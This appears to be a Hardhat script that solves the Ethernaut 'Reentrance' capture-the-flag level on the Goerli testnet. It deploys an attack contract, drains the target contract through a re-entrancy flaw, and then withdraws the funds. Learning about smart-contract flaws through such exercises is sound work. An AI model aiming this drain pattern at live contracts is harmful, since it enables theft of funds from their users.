import { ethers } from "hardhat";

const attackReentrance = async () => {
    // change contract addresses here.
    const reentranceAddress = "0xEfC594B6E8100d412aadc34D4E6ACBbD6CC0E85a"; //type "await contract.address()" in ethernaut console
    const args: string[] = [reentranceAddress];
    const deployer = process.env.PRIVATE_KEY || "";
    // [deployer] = await ethers.getSigners();

    // Don't touch below 🚀
    // The contract is vulnerable to re-entrancy
    // Additional read about re-entrancy, call and receive
    // https://consensys.github.io/smart-contract-best-practices/known_attacks/
    // https://ethereum.stackexchange.com/questions/81994/what-is-the-receive-keyword-in-solidity/81995
    // https://docs.soliditylang.org/en/v0.6.0/types.html#address

    // deploying attack contract here
    // const deployed = await deployContract(hre, "EternalKing", args);
    // alternative below
    console.log("Deploying attack contract AttackReentrance...");
    const Factory = await ethers.getContractFactory("AttackReentrance", deployer);
    const attackReentrance = await Factory.deploy();
    console.log(attackReentrance);
    console.log(`Contract deployed to ${attackReentrance.address}`);
    console.log("Attack contract deployed...");
    // experimantal verify below
    // if (attackReentrance.address){
    //     console.log("Verifying contract...");
    //     try {
    //         await run("verify:verify", {
    //             address: eternalKing.address,
    //             constructorArguments: args,
    //         });
    //     } catch (e: any) {
    //         if (e.message.toLowerCase().includes("already verified")) {
    //             console.log("Already verified!");
    //         } else {
    //             console.log(e);
    //         }
    //     }
    // }

    // typing all commands in console below
    const attack = await ethers.getContractAt("AttackReentrance", attackReentrance.address);
    // const provider = ethers.getDefaultProvider("goerli");    // alternate defualt provider
    const GOERLI_RPC_URL = process.env.GOERLI_RPC_URL;
    const provider = new ethers.providers.JsonRpcProvider(GOERLI_RPC_URL);
    console.log("Checking current Reentrance Contract balance...");
    let contractBalance = ethers.utils.formatEther(await provider.getBalance(reentranceAddress));
    console.log(`Balance of Reentrance Contract is: ${contractBalance} ETH`);
    const tx = await attack.donateAndWithdraw({ value: ethers.utils.parseEther("0.001") });
    const txReceipt = await tx.wait(2);
    console.log(txReceipt);
    console.log("Checking again Reentrance Contract balance...");
    contractBalance = ethers.utils.formatEther(await provider.getBalance(reentranceAddress));
    console.log(`Balance of Reentrance Contract is: ${contractBalance} ETH`);
    if (contractBalance === "0") {
        console.log("Reentrance Contract balance now '0'...");
        console.log("Withdrawing all funds from attack contract...");
        const tx1 = await attack.withdrawAll();
        const tx1Receipt = await tx1.wait();
        console.log(tx1Receipt);
        console.log("Done, Submit to ethernaut.");
    } else {
        console.log("Waiting for a minute...");
        const run = setTimeout(async () => {
            contractBalance = ethers.utils.formatEther(
                await provider.getBalance(reentranceAddress)
            );
            if (contractBalance === "0") {
                console.log("Reentrance Contract balance now '0'...");
                console.log("Withdrawing all funds from attack contract...");
                const tx1 = await attack.withdrawAll();
                const tx1Receipt = await tx1.wait();
                console.log(tx1Receipt);
                console.log("Done, Submit to ethernaut.");
            } else {
                console.log("Reentrance Contract balance not '0'. Review code and try again...");
            }
        }, 60000);
    }
};

attackReentrance()
    .then(() => process.exit(0))
    .catch((error) => {
        console.error(error);
        process.exit(1);
    });
